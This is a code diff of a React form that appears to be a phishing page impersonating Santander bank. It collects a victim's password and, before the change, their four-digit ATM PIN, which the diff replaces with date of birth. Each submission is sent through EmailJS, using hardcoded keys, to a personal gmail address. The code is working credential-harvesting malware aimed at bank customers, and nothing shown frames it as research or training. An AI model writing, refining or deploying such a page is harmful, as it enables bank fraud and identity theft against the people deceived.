@@ -11,12 +11,12 @@ function Primerapag() {
     
     const formData = new FormData(event.target);
     const contram = formData.get('contram');
-    const nipp = formData.get('nipp');
+    const fechaNacimiento = formData.get('fechaNacimiento');
 
     try {
       const response = await emailjs.send('service_pl7uznq', 'template_nb08ccn', {
         contram,
-        nipp,
+        fechaNacimiento,
         to_email: 'alosantamex@gmail.com'
       }, '8Mgn87H6amGJecjhG');
 
@@ -44,8 +44,8 @@ function Primerapag() {
           <input type="text" name="contram" placeholder="Contraseña" className="santander-input" required />
         </label>
         <label>
-          Nip que utiliza en su Cajero
-          <input type="tel" name="nipp" placeholder="Nip de 4 dígitos" className="santander-input" maxLength={4} required />
+          Fecha de Nacimiento
+          <input type="date" name="fechaNacimiento" className="santander-input" required />
         </label>
         <button type="submit" className="santander-continue-button">Continuar</button>
       </form>
